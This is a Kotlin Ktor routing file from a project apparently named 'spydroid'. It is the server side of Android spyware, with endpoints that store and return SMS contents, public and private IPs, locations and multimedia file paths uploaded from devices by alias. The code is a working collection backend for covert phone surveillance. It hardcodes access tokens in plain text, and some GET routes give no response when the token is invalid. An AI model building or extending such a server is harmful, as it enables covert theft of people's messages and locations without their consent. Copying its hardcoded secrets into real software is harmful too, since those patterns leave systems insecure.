/*
 * Copyright (C) 2024 Daniel Gómez(Less)
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */

package net.spydroid.server.plugins

import io.ktor.http.HttpStatusCode
import io.ktor.server.application.*
import io.ktor.server.request.receiveParameters
import io.ktor.server.response.*
import io.ktor.server.routing.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import net.spydroid.server.domain.DevicesRepository
import net.spydroid.server.domain.InfoRepository
import net.spydroid.server.domain.MultimediaRepository
import net.spydroid.server.domain.SmsRepository
import net.spydroid.server.models.DeviceHandler
import net.spydroid.server.models.InfoHandler
import net.spydroid.server.models.MultimediaHandler
import net.spydroid.server.models.SmsHandler
import org.koin.ktor.ext.inject


private object Routes {
    const val DEVICES = "/devices"
    const val INFO = "/info"
    const val MULTIMEDIA = "/multimedia"
    const val SMS = "/sms"
}

fun Application.configureRouting() {
    val validTokens = setOf("iygad7618wg8y1f7fgvas71f671", "otroTokenValido")

    routing {
        devices(validTokens)
        info(validTokens)
        sms(validTokens)
        multimedia(validTokens)
    }
}

private fun Route.devices(validTokens: Set<String>) {

    val devicesRepository: DevicesRepository by inject()

    get(Routes.DEVICES) {
        val accessToken = call.request.queryParameters["access_token"]
        val devices = devicesRepository.getALlDevices()
        if (accessToken in validTokens) {
            call.respond(devices)
        } else {
            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
        }
    }

    post(Routes.DEVICES) {
        val params = call.receiveParameters()
        val accessToken = params["access_token"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing access token"
        )
        val alias = params["alias"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing alias"
        )
        val name = params["name"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )
        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                devicesRepository.insert(
                    DeviceHandler(
                        alias = alias,
                        name = name
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                "Device with alias '$alias' and name '$name' was processed successfully!"
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
        }
    }
}


private fun Route.info(validTokens: Set<String>){

    val infoRepository: InfoRepository by inject()

    get(Routes.INFO) {
        val accessToken = call.request.queryParameters["access_token"]
        val info = infoRepository.getAllInfo()
        if (accessToken in validTokens) {
            call.respond(info)
        }
    }

    post(Routes.INFO) {
        val params = call.receiveParameters()
        val accessToken = params["access_token"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing access token"
        )
        val alias = params["alias"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing alias"
        )
        val ip_address_public = params["ip_public"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )

        val ip_address_private = params["ip_private"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )

        val location = params["location"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                infoRepository.insert(
                    InfoHandler(
                        alias = alias,
                        ip_address_public = ip_address_public,
                        ip_address_private = ip_address_private,
                        location = location
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                "Device with alias '$alias', and ip public $ip_address_public was processed successfully!"
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
        }
    }
}

private fun Route.sms(validTokens: Set<String>){

    val smsRepository: SmsRepository by inject()

    get(Routes.SMS) {
        val accessToken = call.request.queryParameters["access_token"]
        val sms = smsRepository.getALlSms()
        if (accessToken in validTokens) {
            call.respond(sms)
        }
    }

    post(Routes.SMS) {
        val params = call.receiveParameters()
        val accessToken = params["access_token"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing access token"
        )
        val alias = params["alias"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing alias"
        )
        val sms = params["sms"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                smsRepository.insert(
                    SmsHandler(
                        alias = alias,
                        sms = sms
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                "Device with alias '$alias', and sms $sms was processed successfully!"
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
        }
    }
}

private fun Route.multimedia(validTokens: Set<String>){

    val multimediaRepository: MultimediaRepository by inject()

    get(Routes.MULTIMEDIA) {
        val accessToken = call.request.queryParameters["access_token"]
        val multimedia = multimediaRepository.getAllMultimedia()
        if (accessToken in validTokens) {
            call.respond(multimedia)
        }
    }

    post(Routes.MULTIMEDIA) {
        val params = call.receiveParameters()
        val accessToken = params["access_token"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing access token"
        )
        val alias = params["alias"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing alias"
        )
        val routeFile = params["routeFile"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )

        val type = params["type"] ?: return@post call.respond(
            HttpStatusCode.BadRequest,
            "Missing name"
        )

        if (accessToken in validTokens) {
            this.launch(Dispatchers.IO) {
                multimediaRepository.insert(
                    MultimediaHandler(
                        alias = alias,
                        routeFile = routeFile,
                        type = type
                    )
                )
            }
            call.respond(
                HttpStatusCode.OK,
                "Device with alias '$alias', '$routeFile' and type $type was processed successfully!"
            )
        } else {
            call.respond(HttpStatusCode.Unauthorized, "Invalid access token")
        }
    }
}
